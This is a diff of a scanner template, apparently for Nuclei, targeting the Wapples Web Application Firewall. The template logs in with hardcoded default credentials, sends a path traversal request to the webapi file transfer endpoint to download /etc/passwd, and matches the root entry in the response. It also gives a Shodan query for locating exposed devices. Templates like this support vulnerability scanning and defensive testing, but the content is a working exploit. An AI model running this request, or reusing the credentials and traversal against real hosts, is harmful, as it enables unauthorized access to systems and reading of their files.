@@ -1,7 +1,7 @@
 id: wapples-firewall-lfi
 
 info:
-  name: Wapples Web Application Firewall - Webapi Arbitrary File Download
+  name: Wapples Web Application Firewall - Arbitrary File Download
   author: For3stCo1d
   severity: high
   reference:
@@ -9,7 +9,7 @@ info:
   metadata:
     verified: true
     shodan-query: http.title:"Intelligent WAPPLES"
-  tags: wapples,firewall,lfi
+  tags: wapples,firewall,lfi,authenticated
 
 requests:
   - raw:
@@ -18,29 +18,22 @@ requests:
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
 
-        id=systemi&password=db/wp.no1
+        id={{username}}&password={{password}}
 
       - |
         GET /webapi/file/transfer?name=/../../../../../../../../etc/passwd&type=db_backup HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
 
-    cookie-reuse: true
-    extractors:
-      - type: regex
-        name: cookie
-        part: header
-        internal: true
-        group: 1
-        regex:
-          - WP_SESSID=(.+?)
+    attack: pitchfork
+    payloads:
+      username:
+        - systemi
+      password:
+        - db/wp.no1
 
-    matchers-condition: and
+    cookie-reuse: true
     matchers:
       - type: regex
         regex:
           - "root:[x*]:0:0"
-
-      - type: status
-        status:
-          - 200
